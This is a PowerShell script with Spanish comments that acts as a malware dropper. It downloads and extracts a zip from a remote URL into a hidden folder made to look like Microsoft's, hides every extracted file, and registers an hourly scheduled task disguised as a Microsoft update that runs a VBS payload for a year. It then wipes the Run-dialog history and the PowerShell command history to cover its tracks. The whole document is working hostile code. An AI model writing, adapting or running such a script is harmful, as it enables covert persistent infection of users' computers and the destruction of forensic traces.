$destinationFolder = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\MsUpdate"
$zipFile = Join-Path -Path $destinationFolder -ChildPath "Mscn.zip"

# Crear la carpeta de destino
if (-not (Test-Path -Path $destinationFolder)) {
    New-Item -ItemType Directory -Path $destinationFolder -Force | Out-Null
    (Get-Item $destinationFolder).Attributes = "Hidden"
}

Invoke-WebRequest -Uri $url -OutFile $zipFile -ErrorAction SilentlyContinue
Expand-Archive -Path $zipFile -DestinationPath $destinationFolder -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $destinationFolder -Recurse | ForEach-Object {
    $_.Attributes = "Hidden"
}
Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue

Unregister-ScheduledTask -TaskName "MscnSrvUpdate" -Confirm:$false -ErrorAction SilentlyContinue

$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "C:\Users\$env:USERNAME\AppData\Local\Microsoft\MsUpdate\Mscntask.vbs"
$trigger = New-ScheduledTaskTrigger -Once -At "00:00AM" -RepetitionInterval (New-TimeSpan -Minutes 60) -RepetitionDuration (New-TimeSpan -Days 365)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MscnSrvUpdate" -Description "Mantiene actualizado el software de Microsoft. Si esta tarea está deshabilitada o detenida, el software de Microsoft no se actualizará, lo que significa que no se podrán corregir las vulnerabilidades que puedan surgir y es posible que las características no funcionen. Esta tarea se desinstalará cuando el software de Microsoft no la esté usando." -Settings $settings | Out-Null

Start-ScheduledTask -TaskName "MscnSrvUpdate"


# Limpiar historial de ejecucion
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
Remove-Item -LiteralPath $registryPath -Force

# Limpiar historial Powershell
Clear-History
Remove-Item $env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
exit
